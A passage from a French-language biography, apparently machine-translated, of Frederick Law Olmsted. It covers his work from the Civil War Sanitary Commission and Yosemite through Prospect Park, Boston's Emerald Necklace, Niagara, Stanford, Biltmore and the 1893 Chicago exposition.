Au début de l'année 1863, la Commission sanitaire était déjà une organisation beaucoup plus importante, avec plus de 250 communautés dans différentes villes des États-Unis, et il y avait un fossé entre le bureau central à Washington et les unités du théâtre occidental. Afin de résoudre les différends, Olmsted parcourt les États-Unis au printemps, visitant Cleveland, Cincinnati, Chicago, St-Louis et Louisville, ainsi que le quartier général du général Ulysses Grant en Louisiane, où il s'entretient avec le futur président des États-Unis. La nouvelle de la bataille de Gettysburg surprend Olmsted à Philadelphie, où il s'occupe de l'approvisionnement en nourriture, et trois jours plus tard, il est sur les lieux de la bataille la plus sanglante de la guerre, distribuant de l'aide aux blessés.
Dans les mines d'or.
Les frictions au sein de la Commission d'assainissement portent notamment sur l'allocation de fonds pour une campagne particulière. Olmsted, se souvenant d'un conflit similaire avec Andrew Green lors de son passage à Central Park, décide de démissionner de son poste d'administrateur de l'organisation. La guerre touche à sa fin et il doit planifier une carrière en temps de paix. Le célèbre journaliste Charles Dana propose à Frederick de prendre en charge la gestion des mines d'or du domaine de Mariposa, au pied de la Sierra Nevada en Californie, qui vient d'être acquis par un groupe de spéculateurs financiers.
En octobre 1863, Olmsted arrive à San Francisco et, quelques jours plus tard, atteint à cheval la petite ville de Bear Valley, où se trouvent les bureaux de la compagnie et plusieurs mines d'or. À la surprise d'Olmsted, l'équipement d'extraction de l'or s'avère très détérioré et en partie inutilisable. Une grave sécheresse sévit dans la région et la rivière Mariposa, peu profonde, ne fournit pas assez d'eau pour l'amalgamation, le processus d'extraction du métal du minerai ; au lieu des bénéfices escomptés, l'entreprise enregistre d'importantes pertes. La direction a également révélé que le propriétaire précédent, John Fremont, n'avait non seulement pas accordé suffisamment d'attention à son entreprise, mais qu'il avait également contracté des dettes importantes dont les nouveaux propriétaires n'étaient pas au courant. Ces informations sont révélées par inadvertance lors d'une audience au tribunal de New York en décembre 1864. La procédure n'est pas directement liée au domaine de Mariposa, mais affecte la réputation de l'un de ses nouveaux propriétaires, l'ancien maire de New York, George Opdyke, qui semble également avoir eu recours à des manœuvres frauduleuses. L'enquête aboutit à la saisie de la propriété, dont Olmsted lui-même n'apprend l'existence que par un huissier arrivé au bureau au début de l'année 1865.
Entre janvier et mai 1865, Olmsted passe la majeure partie de son temps à San Francisco, où il utilise le télégraphe pour tenter de contacter le conseil d'administration de la société afin d'obtenir de nouvelles instructions. Pendant cette période, il parvient à conclure un contrat à court terme pour la conception du cimetière de Mountain View à Oakland, dans lequel il démontre à nouveau son style novateur : il comprend des tombes temporaires pour les immigrants chinois et un grand nombre de parcelles individuelles. Le cimetière est planté de cyprès à feuilles persistantes qui, depuis l'Antiquité, symbolisent l'immortalité. Calvert Vox, avec qui Olmsted avait correspondu tout au long de sa vie en Californie, le persuade dans une lettre de retourner à New York : la ville a repris ses projets de développement de Central Park après la fin de la guerre. En outre, un autre parc paysager devait être créé dans la région de Brooklyn. La décision est facilitée par le fait que le nouveau propriétaire du Mariposa Estate refuse les services d'Olmsted.
Vallée de Yosemite.
Parallèlement à son travail principal au Mariposa Estate, Frederick Olmsted s'est engagé dans un autre projet qui lui a permis de découvrir une nouvelle facette de sa personnalité et qui a eu des conséquences considérables. Non loin de Bear Valley se trouve la vallée de Yosemite, dans la chaîne de montagnes de la Sierra Nevada. Dans la première moitié des années 1960, elle est devenue célèbre grâce au travail du photographe Carlton Watkins et du peintre Albert Bierstadt. Les deux maîtres ont visité le Yosemite indépendamment l'un de l'autre et ont exposé leurs œuvres dans des galeries new-yorkaises. Un autre visiteur fut le directeur de la compagnie de navigation à vapeur Israel W. Raymond, qui non seulement admirait les paysages de la vallée, mais voyait aussi la possibilité d'attirer des touristes. Il envoie une lettre au sénateur John Conness pour lui demander de limiter l'activité économique dans la vallée en la confiant à l'État. Frederick Olmsted, qui n'a jamais rencontré Raymond, figure en tête de liste des administrateurs potentiels. Conness rédige un projet de loi à cet effet à l'intention de la législature locale, qui l'approuve à son tour, en copiant la liste des administrateurs figurant dans la lettre de Raymond. Le 30 juin 1864, un projet de loi prévoyant le transfert de la vallée de Yosemite et de la forêt voisine de Mariposa à l'État de Californie est signé par le président Lincoln.
Olmsted reçoit la nouvelle de sa nomination à la tête du comité de supervision le jour même où il revient d'une promenade à cheval dans le Yosemite. Il avait passé plus de deux semaines dans la vallée avec sa famille et son guide, n'en gardant que des souvenirs admiratifs : "L'unité de la plus profonde grandeur et de la plus profonde beauté de la nature n'est pas dans telle ou telle caractéristique, ni dans tel ou tel paysage, ni même dans aucun paysage en soi, mais partout et tout autour, où que le visiteur se trouve, il est entouré par le plus grand triomphe de la nature, le Yosemite".
Dans ses nouvelles fonctions, Olmsted fait réaliser, à ses frais, un dessin des limites de la zone protégée et prépare des propositions de sentiers de randonnée et de campings adaptés aux randonneurs. Un plan détaillé de la vallée est présenté par lui en août 1865 lors d'une réunion avec le président de la Chambre des représentants et futur vice-président des États-Unis, Shyler Colfax, qui arrive au Yosemite entouré de nombreux journalistes. Olmsted fait visiter le futur parc à la délégation représentative et prononce un jour publiquement les principales thèses d'un traité préparé pour l'occasion : ""Le Yosemite doit rester à jamais protégé et géré pour le libre accès de l'humanité", affirme Olmsted, "et par conséquent l'entretien du parc, l'hospitalité aux visiteurs de toutes les parties du monde, doivent être le noble devoir d'un État exclusivement souverain"". Olmsted prévoyait qu'un jour le nombre de visiteurs dans la vallée se chiffrerait en millions et que des efforts de l'État seraient nécessaires pour préserver sa nature fragile. La région est restée sous la juridiction de l'État jusqu'en 1906, date à laquelle, après la mort d'Olmsted, elle a été transformée en parc national de Yosemite sous la pression de l'opinion publique.
Projets post-guerre de Sécession.
Prospect Park.
L'économie américaine était en plein essor après la fin de la guerre civile en 1866-1873, ce qui se reflétait dans les contrats de construction. De retour à New York en novembre 1865, Olmsted et Vaux fondent le cabinet Olmsted, Vaux &amp; Company, dont l'activité principale est l'architecture paysagère. Les associés rétablissent la coopération avec le Central Park Board of Trustees, dont ils reprennent les fonctions d'architectes. Parallèlement, le cabinet est chargé de créer Prospect Park. Un grand parc public à Brooklyn, comparable en taille et en style à Central Park à Manhattan, avait été planifié par la ville dès 1860, mais il avait dû être reporté à cause de la guerre. En l'absence d'Olmsted, une commande préliminaire pour la conception de la nouvelle zone de loisirs est proposée à Vox, mais l'architecte lui-même a besoin du soutien de son compagnon et le persuade pour cette raison de retourner sur la côte Est. Un plan détaillé du parc, élaboré par Olmsted et Vox, est préparé en janvier 1866 ; quelques mois plus tard, la construction débute.
Comme dans leur première œuvre, les architectes se concentrent sur l'idée de recréer un coin de nature sauvage au milieu des pâtés de maisons. L'un des joyaux de Prospect Park est la construction d'un long cours d'eau qui, selon les sections, crée l'illusion d'un ruisseau turbulent dans un ravin de montagne boisé, ou d'un lac pittoresque avec de nombreuses petites îles. Contrairement au projet de Manhattan, où le réservoir central a été creusé à l'emplacement d'un ruisseau marécageux et partiellement alimenté par ses eaux, à Brooklyn, l'ensemble du système a dû être créé de toutes pièces, alimenté par l'eau d'un puits au moyen d'une puissante pompe. Le fond du ruisseau a été tapissé de carreaux de céramique sur toute sa longueur, comme à Central Park. L'un des constructeurs, l'ingénieur John Coulier, a inventé une machine spéciale qui ressemblait à un énorme chariot : il a serré le tronc des deux côtés, l'a sorti du sol avec le système racinaire, l'a transporté et l'a planté à son nouvel emplacement. L'équivalent du Sheep Meadow de Central Park était le Long Meadow de Brooklyn, une prairie d'un kilomètre et demi de long située dans le coin nord-ouest du parc. Les auteurs ont planifié les chemins de la prairie en dessous du niveau du sol, de sorte que de loin, on a l'impression que les gens glissent le long de la prairie. Malgré la diversité des paysages du parc, ils font tous partie d'un système global intelligemment conçu, destiné à créer un sentiment d'harmonie dans une retraite rurale, à l'abri de l'agitation de la ville. La conception de Prospect Park Plaza, une place ovale située à la limite nord du parc, où l'entrée principale a été aménagée, et des rues environnantes, constituait une partie distincte du projet.
Chicago et Buffalo.
Entre 1869 et 1871, Olmsted, Vaux &amp; Co. travaille sur plusieurs projets à Chicago et Buffalo, tout en offrant des services de conseil à New York et Brooklyn. La commande inhabituelle portait sur la conception et la construction du nouveau Riverside Village à quelques kilomètres de Chicago, qui devait combiner un mode de vie rural et sédentaire avec la présence d'une infrastructure urbaine moderne. Olmsted a conçu l'aménagement de cette communauté en consacrant environ 40 % du site à des espaces publics, en particulier des parcs. Pour mettre en valeur la vie rurale paisible, l'architecte a dessiné des rues curvilignes, suivant les caractéristiques du paysage et évitant les angles aigus. Après un grand incendie à Chicago en 1871 et la dépression économique qui s'ensuivit, l'entreprise cliente fit faillite et sa coopération avec les architectes fut interrompue à un stade précoce de la construction, mais à l'avenir, le plan Olmsted fut mis en œuvre de manière générale et le concept d'urbanisme fut utilisé dans tous les États-Unis. En reconnaissance du travail des artisans, les blocs subsistants de Riverside ont reçu en 1970 le statut de National Historic Landmark.
À Buffalo, Olmsted et Vox s'étaient constamment orientés vers le concept de parkland, c'est-à-dire une série d'espaces récréatifs diversifiés dans différentes parties de la ville, reliés par des avenues semblables aux Champs-Élysées ou à l'avenue Foch à Paris. L'idée de larges rues de type boulevard pour les caravanes et les piétons a été suggérée et réalisée dès 1866 lors de l'aménagement de la zone autour de Prospect Park. Les avenues qui y mènent sont plantées de vastes ormes couronnés et sont nommées Eastern Parkway et Ocean Parkway. Le néologisme "parkway" lui-même, introduit par Olmsted et Vox, est ensuite largement utilisé dans l'est des États-Unis et au Canada. Trois zones de parcs étaient prévues à Buffalo. Le plus central et le plus grand (1,52 km²) d'entre eux était une zone d'étape à la limite nord de la ville, désignée simplement comme ""The Park" par les partenaires renommé "Delaware Park"" au 20e siècle. Selon ce plan, des avenues radiales divergentes devaient conduire à deux autres parcs de la ville : l'un sur les rives du lac Érié et de la rivière Niagara qui en découle (" The Front "), l'autre à l'est de Buffalo (" The Parade ", aujourd'hui Martin Luther King Park). Alors que dans le premier cas, les auteurs ont poursuivi la tradition de recréer des paysages "pastoraux" avec des forêts, des lacs et des pelouses, les deux autres zones de loisirs impliquaient une orientation fonctionnelle différente. Sur les rives rocheuses de l'Erie et du Niagara, une large terrasse a été construite pour admirer l'étendue de l'eau, tandis que Parade Park a été conçu pour des événements sociaux : pique-niques, réunions, jeux sportifs et entraînement militaire.
Un autre projet réussi d'Olmsted, Vaux &amp; Co. à Buffalo fut l'aménagement paysager de l'hôpital psychiatrique local, construit par le jeune architecte Henry Richardson, presque inconnu à l'époque. Le plan original élaboré par les partenaires commerciaux fut perdu, mais Olmsted en créa par la suite un nouveau, sans la participation de Vox, qui fut réalisé. L'amitié née de la collaboration avec Richardson joue un rôle majeur dans la suite de la carrière d'Olmsted.
Un incendie à Chicago détruit les plans déjà approuvés de deux nouveaux parcs publics de la ville, South et Jackson, qui devaient être reliés par un canal panoramique avec des stations de bateaux. Après la crise financière, un autre architecte, Horace Cleveland, créa son propre projet à partir des idées de base d'Olmsted. Le terrain situé sur les rives du lac Michigan, sur lequel une deuxième zone de loisirs était prévue, resta longtemps inexploité, jusqu'à ce que, dans les années 1890, Olmsted, déjà au crépuscule de sa carrière, y conçoive les plans de la prochaine exposition universelle.
Rupture avec Calvert Vox.
Grâce à son caractère grégaire et persuasif, Olmsted acquiert une position assez importante dans la société new-yorkaise, contrastant fortement avec celle de Vox, éduqué et travailleur mais socialement modeste. La nomination d'Olmsted comme commissaire temporaire du Public Parks Department de la ville en mai et octobre 1872, alors que son président Henry Stebbins était en congé en Europe, a contribué en partie aux frictions entre les deux compagnons. Une couche influente d'Américains commença à percevoir Olmsted comme le principal créateur de Central Park, en dépit non seulement de la réalité (Olmsted et Vox y ont contribué à parts égales, chacun à leur manière), mais aussi des objections d'Olmsted lui-même, qui corrigeait invariablement les journalistes sur l'iniquité d'une telle conclusion. Néanmoins, le 18 octobre 1872, Olmsted, Vaux &amp; Co. cessa d'exister et le partenariat officiel de ses fondateurs prit fin. Par la suite, Olmsted et Vaux continuent de travailler ensemble sur des projets individuels, mais leur coopération n'est plus aussi étroite et amicale qu'auparavant.
Parcs Morningside et Riverside.
En 1873, l'histoire de deux autres parcs de la ville de New York conçus conjointement par Olmsted et Vox : Morningside et Riverside. Les deux projets sont approuvés par le Department of Public Parks à l'automne de la même année, mais leur construction est quelque peu retardée.
Olmsted, qui avait été nommé architecte de Morningside Park (Calvert Vox n'était pas initialement impliqué dans le projet), commença à travailler presque immédiatement : selon le rapport, à la fin de l'année, il était possible de tracer des chemins, de préparer une fosse et des tuyaux de drainage pour le réservoir et de commencer à construire des enclos de pierre. Peu après, cependant, les travaux furent interrompus en raison de la crise économique et, en 1880, Jacob Mould fut chargé de superviser la construction. Quatorze ans plus tard, en 1887, Olmsted fut invité à revenir en tant qu'architecte, déterminé à reprendre le tracé d'origine. À son tour, Olmsted lui-même insiste pour faire appel à Vox, avec qui il avait alors partiellement rétabli la collaboration. Contrairement à Central et Prospect Park, les architectes décident de ne pas modifier radicalement le paysage, mais de conserver sa topographie rocheuse complexe.
La construction de Riverside Park dans l'Upper West Side débute en 1876. Contrairement aux projets précédents de la ville de New York, celui-ci impliquait l'aménagement d'une bande de terre sur la rive de l'Hudson, entre la voie ferrée anciennement tracée et le plateau rocheux. Olmsted s'oppose à l'abondante verdure qui masquerait le panorama du bas de l'Hudson. Il a conçu un sentier équestre sinueux, bordé de rangées d'arbres, et plusieurs passerelles ombragées ; il a prévu des plates-formes d'observation. Le long de la limite orientale du parc, orientée vers l'intérieur des terres, se trouve un boulevard appelé Riverside Drive. La collaboration d'Olmsted avec les organisateurs de la zone de loisirs se poursuivit jusqu'en 1878, et une grande partie de son plan fut mise en œuvre.
Transformation du Capitole.
Le projet d'aménagement des abords du Capitole, le bâtiment du Congrès américain à Washington, DC, qui avait subi d'importantes modifications architecturales au cours des années précédentes, a été couronné de succès. En mars 1874, lorsqu'Olmsted est chargé d'aménager des jardins et des parterres près du parlement, les alentours ne sont plus qu'une pelouse piétinée avec de rares arbres rabougris, et le Capitole lui-même - un bâtiment allongé avec un dôme d'une hauteur disproportionnée, de plus, la façade principale surplombe les autres bâtiments fédéraux sur le côté opposé.
En juin 1874, l'architecte présente un projet détaillé pour la reconstruction de la place, dans lequel il dessine des allées sinueuses, des bordures, de la verdure, des fontaines, de petites formes architecturales et d'autres constructions. L'auteur était particulièrement fier d'une petite maison de repos avec une fontaine d'eau potable et un carillon, qu'il appela "Maison d'été". Contrairement aux parcs panoramiques conçus précédemment, où chaque détail était destiné à recréer un sentiment de vie à la campagne, l'objectif principal était ici de mettre en valeur la grandeur du bâtiment du Parlement. Les sols autour du Capitole ont été fertilisés avec du guano du Pérou. Un millier d'arbres sont plantés, principalement des ormes, des tilleuls, des marronniers d'Inde et des chênes[120], ainsi que des magnolias, des mûriers et des liquidambras. Le Capitole lui-même subit également des modifications : sur proposition d'Olmsted, les façades nord, ouest et sud du bâtiment sont complétées par des terrasses en marbre, ce qui modifie non seulement ses proportions visuelles (elles deviennent plus harmonieuses), mais le réoriente également d'est en ouest - vers l'allée nationale et l'ensemble des bâtiments gouvernementaux, dont la Maison-Blanche.
Troisième voyage en Europe.
Malgré de nombreuses commandes, mais temporaires, Olmsted conserva son poste d'architecte paysagiste pour le service des parcs publics de la ville de New York tout au long des années d'après-guerre, revenant après chaque voyage pour travailler à la remise en ordre de Central Park. La coopération d'Olmsted avec le Conseil des Superviseurs nouvellement élu, dont la plupart des membres se considéraient comme des adeptes du mouvement Tammany Hall, s'est accompagnée de fréquents conflits. Comme le soulignent les chercheurs, la principale raison du mécontentement des clients est l'opposition de l'architecte aux nouvelles idées des administrateurs, comme l'organisation de courses de chevaux dans la partie sud du parc ou l'installation d'une ménagerie sur la pelouse. À la suite de cet affrontement, le poste d'Olmsted est supprimé à la fin de l'année 1877, le privant de son emploi principal et ne pouvant compter que sur des commandes.
Au milieu de la tourmente, Olmsted montre des signes de diverses maladies, notamment de dépression. Il se replie sur lui-même, hanté par des pensées anxieuses de perte future de ses moyens de subsistance. Au début de l'année 1878, l'architecte se rend en Europe sur les conseils de son médecin, où se trouve alors son neveu et fils adoptif John. John se préparait à suivre les traces de son beau-père et, à cette fin, il étudiait l'art des jardins de l'Ancien Monde tout en faisant ses courses. De janvier à avril, Olmsted visite plusieurs villes européennes avec son fils - il revisite Berkenhead Park, visite Regent's Park à Londres et le jardin anglais de Munich, fait une promenade en gondole le long des canaux de Venise et se promène dans les rues de Paris. Comme lors de ses précédents voyages, Olmsted note soigneusement le résultat de ses observations dans un carnet, tandis que John, qui l'accompagne et qui est doué pour le dessin, réalise des croquis.
Boston.
Les années quatre-vingt et la première moitié des années quatre-vingt-dix sont la période de la plus grande activité créatrice de Frederick Olmsted. À un moment donné, les commandes deviennent si nombreuses qu'il ouvre sa propre entreprise à Brookline, dans la banlieue de Boston, et engage du personnel supplémentaire. Lorsqu'il recevait une commande pour une localité particulière, il se rendait sur place, étudiait la zone, créait un projet et, sur la base de ce projet, établissait un plan de travail direct. Le projet est réalisé par son représentant et Olmsted lui-même n'apparaît sur le site que lorsque sa participation directe est requise.
Vers 1875, alors que les services d'Olmsted à New York étaient de moins en moins demandés, on discutait vivement à Boston de projets visant à aménager de nouveaux espaces verts en plus du Boston Common et du Public Garden existants. L'architecte souhaitait vivement coopérer avec la mairie de cette ville, mais sa première demande fut infructueuse : au lieu d'une commande, le maître reçut une invitation à diriger le comité d'admission pour la sélection du projet sur la base d'un concours. Ce n'est qu'après que le plan du vainqueur du concours se soit avéré irréalisable (et qu'Olmsted lui-même ait refusé de participer au jugement) que les commissaires de Boston se sont présentés à lui. L'architecte Henry Richardson, qui connaissait bien Olmsted et les commissaires, joua un rôle important dans l'accord.
Au départ, il s'agit d'améliorer un petit terrain situé à l'embouchure de la rivière Charles, périodiquement inondée par les eaux de l'océan Atlantique. En fait, le territoire du futur parc, baptisé plus tard Back Bay Fens, était une friche marécageuse à l'emplacement d'une prairie de marais salants, impropre à la culture de la plupart des plantes. Il était également fortement pollué par les déchets et les eaux usées provenant des quartiers urbains voisins. Avec l'aide d'ingénieurs, Olmsted a nettoyé et détourné le ruisseau à travers la zone, le rendant plus sinueux et plus pittoresque. Des vannes de régulation du niveau de l'eau ont été placées à l'endroit où le cours d'eau se jette dans la rivière. D'autres structures hydrauliques accumulaient les flux d'orage qui polluaient le parc avec des eaux usées. Le parc a été planté de plantes tolérant les sols marécageux : carex, spartine, distichlis, peigne et prunier de mer. À titre expérimental, des arbustes de Mahonia padoubolis à feuilles persistantes, originaires de l'ouest des États-Unis, ont été plantés. Les chemins ont été conçus de manière que les visiteurs puissent admirer la prairie recréée sans l'endommager. À son tour, Henry Richardson conçut le large pont qui marque aujourd'hui le début de Boylston Street.
En 1879, Olmsted, à l'invitation de Charles Sargent, commença à dessiner des plans pour transformer les terrains de l'Arnold Arboretum, une collection de plantes ligneuses de l'Université de Harvard, qui venait d'ouvrir ses portes. Comme le Back Bay Fens Park, l'Arboretum devait devenir un autre espace de loisirs gratuit pour les habitants de Boston et les visiteurs. Olmsted a conçu un système d'allées sinueuses le long desquelles des arbres ont été plantés, groupés selon la classification de Bentham et Hooker. Sargent souhaitait que ""les visiteurs qui traversent l'arboretum puissent se faire une idée générale de la végétation arboricole de la ceinture tempérée de l'hémisphère nord sans quitter leur voiture". Le botaniste espérait que "le fait d'éviter les lignes rigides et formelles inhérentes aux jardins botaniques encouragerait une étude complète de la collection, à la fois sur le plan scientifique et pictural"".
Au fur et à mesure que les projets avancent et que de nouveaux fonds sont alloués, Olmsted reçoit de plus en plus de commandes. Les autorités de la ville lui demandent de les aider à créer un vaste ensemble de parcs et d'espaces récréatifs reliés par des boulevards et des canaux. L'idée d'un système d'espaces publics, conçue par Olmsted et Vox alors qu'ils travaillaient sur le Prospect Park de Brooklyn, puis réalisée à Buffalo, fut développée à Boston et dans ses environs. Entre 1878 et 1895, la ville a créé une chaîne d'espaces verts (aujourd'hui connue sous le nom de "collier d'émeraude") pour les loisirs actifs et la contemplation.
Le projet le plus ambitieux de la série est la création du Franklin Park (ouvert en 1885), nommé d'après l'un des fondateurs de l'État américain, Benjamin Franklin. Olmsted a divisé la future zone de loisirs en deux sections séparées par des routes, l'une planifiée dans son style "pastoral" traditionnel et l'autre (connue sous le nom de "The Playstead") destinée aux événements sportifs de plus en plus populaires tels que le baseball, le croquet et le tennis. Un autre projet planifié et mis en œuvre par Olmsted consistait à améliorer les rives du lac Jameika Pond, un plan d'eau créé par le thermokarst au cours de la dernière période glaciaire. La construction de l'espace vert Riverway le long de la rivière Muddy, qui s'écoule de l'étang Jameika, rappelle le premier projet Back Bay Fens de Boston : la vallée d'un cours d'eau pollué et nauséabond a été transformée en un parc avec des chemins et des plantations d'arbres. Commons Avenue, l'une des principales rues de Boston, est également reconstruite, avec une large pelouse, des arbres et une voie piétonne dans son terre-plein.
Pendant qu'il travaille sur ces projets, Olmsted déménage avec sa famille de New York à Brookline, une banlieue de Boston, en 1883. Le domaine de l'architecte, qu'il nomme Fairsted, reste sa résidence permanente jusqu'à sa retraite. En 1980, le domaine est devenu propriété fédérale et a obtenu le statut de National Historic Landmark. Il est aujourd'hui organisé comme un musée qui abrite les effets personnels du propriétaire, des photographies et des documents d'archives. Un parc miniature, créé par Olmsted lui-même, se trouve sur le terrain.
Chutes du Niagara.
En 1869, alors que Buffalo commençait à peine à concevoir des zones de loisirs, Olmsted visita les chutes du Niagara près de la ville. Olmsted était accompagné de l'architecte Henry Richardson et de l'homme politique et procureur fédéral William Dorsheimer. Comme Olmsted l'a rappelé plus tard, c'est au cours de ce voyage que le mouvement Free Niagara est né à l'hôtel Cataract House, dans le but d'établir une zone protégée adjacente aux chutes. L'état de ce site naturel unique, dont la beauté immaculée avait été perturbée par de nombreux bâtiments industriels, canaux, jetées et attractions commerciales, suscitait des inquiétudes. Les foules de touristes étaient obligées de payer les propriétaires des parcelles adjacentes pour voir les cascades d'eau. Olmsted estimait que la visite du Niagara aurait dû être gratuite et s'apparenter à un pèlerinage de rencontres réfléchies et sans hâte avec la faune et la flore.
Dix ans plus tard, en 1880, un rapport d'enquête sur l'état des chutes du Niagara, préparé par les dirigeants du mouvement, a été soumis à la législature de l'État de New York, accompagné d'une pétition demandant que les terres entourant le site soient nationalisées et interdites à toute activité commerciale. La pétition collective a été signée par des centaines de personnes influentes de l'époque, dont Frederick Olmsted, Charles Norton, professeur à Harvard, Charles Darwin, fondateur de la théorie de l'évolution des espèces, Thomas Carlyle, Ralph Emerson, Henry Longfellow, John Ruskin et John Whittier, ainsi que Morrison Waite, juge en chef de la Cour suprême des États-Unis. La première tentative de protection des chutes fut un échec : le projet de loi fut bloqué par le gouverneur Alonzo Cornell. Ce n'est qu'en 1883, après une série d'articles de presse et avec l'arrivée du nouveau chef d'État, Grover Cleveland, qu'un projet de loi visant à créer un conseil d'administration pour le nouveau parc est approuvé et promulgué. La Niagara Reservation - nom initial de la zone de loisirs - est créée en avril 1885.
En 1886, Olmsted, qui avait dirigé le mouvement de préservation du Niagara pendant toutes ces années et participé à la préparation du rapport et de la pétition, fut nommé architecte pour la construction de la zone de conservation. Il s'adresse à son tour à son ancien compagnon Calvert Vox pour lui proposer une coopération. L'année suivante, en 1887, Olmsted et Vox présentèrent un plan de reconstruction en deux parties. La première partie proposait de construire des chemins et des sentiers le long de la rive américaine de la rivière, et de construire une plate-forme d'observation à Prospect Point au bord des chutes américaines. La seconde partie consistait à recréer une forêt vierge sur l'île Goat, entre les deux bras de la rivière Niagara, où les vacanciers pourraient se promener sur des sentiers s'enfonçant dans l'île et admirer sa nature. Une route était proposée autour du périmètre de l'île et plusieurs plates-formes d'observation avec vue sur la rivière et les chutes d'eau. Enfin, plusieurs ponts piétonniers devaient relier l'île Goat à d'autres petites îles situées en amont. Après l'approbation du projet, sa mise en œuvre est principalement assurée par Vox, tandis qu'Olmsted se concentre sur d'autres travaux.
L'université de Stanford.
Alors qu'il commence à travailler sur la réserve près des chutes du Niagara, Olmsted rencontre Leland Stanford, grand industriel et ex-gouverneur de Californie, qui se trouve alors dans les États de l'Est à la recherche de personnel pour son université en construction à Palo Alto. L'homme d'affaires propose à l'improviste à l'architecte de créer un plan architectural préliminaire pour le campus et, à la surprise d'Olmsted, accepte sans hésiter des honoraires inhabituellement élevés, soit 10 000 dollars. En août-septembre 1886, Olmsted se rend à nouveau sur la côte pacifique des États-Unis, cette fois en empruntant le tout nouveau chemin de fer transcontinental. Il explore le site du futur établissement d'enseignement, visite le nouveau Golden Gate Park de San Francisco et revisite Mariposa Grove dans le Yosemite.
Déjà chez lui à Brookline, l'architecte dessine un plan détaillé du campus universitaire qui, par certains aspects, diffère nettement de l'architecture traditionnelle des établissements d'enseignement supérieur de l'époque. Selon Olmsted, le campus devait être le centre de la vie sociale pour les professeurs et les étudiants, permettant à la fois de se déplacer d'un bout à l'autre et de communiquer. Les bâtiments reliés entre eux et revêtus de briques, à l'instar de la basilique Saint-Pierre de Rome, étaient ornés de galeries extérieures avec des arcs et des colonnes, qui permettaient non seulement de s'abriter de la pluie et du soleil, mais aussi de rencontrer des étudiants d'autres disciplines et de nouer des liens sociaux. Des palmiers et d'autres plantes arides ont été plantés le long des allées pavées, créant ainsi une oasis au milieu du paysage désertique. La route d'accès, qui divisait le campus en deux parties symétriques, bifurquait en un point et s'incurvait autour de l'entrée principale en arc de cercle. Les étudiants pouvaient vivre non pas dans des dortoirs exigus, mais dans des maisons de type cottage sur le campus. Si Olmsted est responsable de la disposition générale des installations et de l'aspect esthétique du campus dans son ensemble, l'architecture directe des bâtiments universitaires est confiée au cabinet Shepley, Rutan and Coolidge de Boston, composé d'étudiants d'Henry Richardson.
Pour diverses raisons, le projet d'Olmsted n'a été que partiellement réalisé. Par exemple, le plan de construction des cottages n'a survécu que sur papier. Un arboretum, semblable à celui qu'Olmsted avait conçu à Harvard, n'a pas été créé. Enfin, les bâtiments académiques eux-mêmes, conçus à l'origine comme des blocs rectangulaires reliés par des passages couverts, commencèrent à se développer dans une direction différente. Cependant, le bâtiment principal, qui se distingue aujourd'hui par ses galeries à arcades, ainsi que la disposition des espaces verts et des routes principales ont été conservés tels qu'ils avaient été conçus par le créateur.
Le domaine de Biltmore.
En 1888, Olmsted se rendit à nouveau en Caroline du Nord, cette fois pour discuter de la construction d'un nouveau domaine Biltmore pour George Vanderbilt, l'une des dynasties les plus riches des États-Unis. Il avait visité la région pour la première fois avant la guerre civile, alors qu'il était journaliste et qu'il recueillait des informations sur les mœurs du Sud esclavagiste. À la grande déception de l'architecte, le paysage naturel mémorable avait changé de façon spectaculaire entre-temps : tout d'abord, les longues forêts à travers lesquelles il s'était promené avaient disparu. Les centaines de kilomètres carrés du futur domaine n'étaient plus qu'une zone de coupe à blanc où les anciens propriétaires avaient installé des enclos à cochons. Lorsque Olmsted demanda au nouveau propriétaire ce qu'il souhaitait y voir, Vanderbilt suggéra un parc. Cependant, la construction et l'entretien d'un parc aussi vaste s'avérant trop coûteux, Olmsted le persuada de cultiver une forêt semblable à la forêt relictuelle présente sur une grande partie de la propriété. Une fois de plus, comme dans le cas du Yosemite et des chutes du Niagara, l'architecte se révèle être un défenseur de la nature sauvage, un concept très rare à la fin du XIXe siècle.
Contrairement à Stanford, George Vanderbilt laissa à Olmsted une grande liberté pour mettre en œuvre sa vision de l'aménagement paysager du domaine. En retour, Olmsted lui-même considérait que le projet avait une grande importance sociale, en dépit de sa nature privée. L'architecte pensait que des visiteurs influents prendraient note de sa création et l'utiliseraient comme modèle pour restaurer des zones de nature vierge dans tout le pays. Au fur et à mesure que l'on s'éloigne du domaine, une transition en douceur entre le "jardin ordinaire" et la forêt a été envisagée. Les plates-bandes et les parterres ont été suivis d'un "parc de printemps" (aujourd'hui "parc d'azalées") avec des plantes ornementales indigènes. Vint ensuite la "réserve de cerfs", un étang avec un pont et une station de bateaux, et enfin une solide zone boisée. Les visiteurs qui pénètrent dans le domaine parcourent environ 5 km sur une route forestière sinueuse avant d'apercevoir le luxueux palais du propriétaire. Le domaine a été construit par l'architecte Richard Hunt, connu pour ses immeubles résidentiels destinés aux Américains riches et influents. À la suggestion d'Olmsted, il a conçu une terrasse offrant une vue panoramique sur les Blue Ridge Mountains des Appalaches.
Tout ce qui a été conçu au domaine n'a pas été réalisé dans la pratique : par exemple, l'arboretum, semblable à la pépinière de Harvard, est resté sur le papier. En revanche, l'idée de recréer la forêt a eu des conséquences importantes. Au fur et à mesure que la zone s'étendait, elle nécessitait l'intervention croissante de forestiers professionnels. Ainsi, sur la recommandation d'Olmsted, un jeune diplômé de École nationale du génie rural, des eaux et des forêts de Nancy, en France, Gifford Pinchot, futur homme politique de premier plan et fondateur du Service national des forêts, est engagé comme forestier en chef. En 1914, la veuve de John Vanderbilt vend au gouvernement fédéral environ 350 km² de terres forestières, sur lesquelles la Pisgah National Forest sera formée plus tard.
Exposition universelle de Chicago.
Olmsted n'accepte pas immédiatement la proposition de l'industriel James Ellsworth de participer à la préparation de l'Exposition universelle de 1893, principalement en raison de sa charge de travail sur d'autres projets. Cependant, au cours de l'été 1890, il se rendit à Chicago à l'invitation du comité chargé de sélectionner un site adéquat. Selon Olmsted, en raison de la topographie plate et de l'absence de points de vue lumineux, le seul point fort de la ville était le lac Michigan, sur les rives duquel il avait un jour envisagé, avec Vox, d'aménager le parc Jackson. La zone où devait être aménagée l'aire de loisirs était un terrain vague côtier avec des dunes de sable et des plaines marécageuses. Malgré l'aspect inesthétique du site et son éloignement du centre-ville, l'architecte réussit à convaincre les organisateurs de choisir cet emplacement. La commission est confrontée à la tâche difficile de construire en deux ans un complexe d'exposition sur un site vide, à une échelle qui n'a rien à envier à l'exposition de Paris de 1889. 
